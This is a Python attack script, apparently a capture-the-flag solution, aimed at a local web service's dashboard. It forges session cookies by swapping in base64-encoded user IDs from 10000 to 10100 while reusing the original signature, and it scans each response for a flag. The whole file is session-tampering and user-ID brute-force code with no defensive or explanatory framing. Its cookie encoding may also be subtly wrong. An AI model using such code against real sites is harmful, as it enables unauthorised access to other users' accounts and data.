import base64, json, requests

TARGET = "http://127.0.0.1:33187/dashboard"
ORIGINAL = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"

print('Starting brute force 10000-10100')

for uid in range(10000, 10101):
    try:
        parts = ORIGINAL.split('.')
        payload = base64.b64encode(json.dumps({'user_id':str(uid)}, separators=(',',':')).encode()).decode()
        cookie = f"{payload}.{parts[1]}.{parts[2]}"
        
        r = requests.get(TARGET, headers={'User-Agent':'Mozilla/5.0'}, cookies={'session':cookie}, timeout=5)
        
        if 'FLAG{' in r.text:
            start = r.text.find('FLAG{')
            end = r.text.find('}', start)
            if end != -1:
                flag = r.text[start:end+1]
                print(f"[FOUND] uid={uid} flag={flag}")
                exit()
        
        if uid % 10 == 0:
            print(f'[*] Tested up to {uid}')
            
    except Exception as e:
        print(f'[!] Error at {uid}: {e}')

print('[-] No flag found')
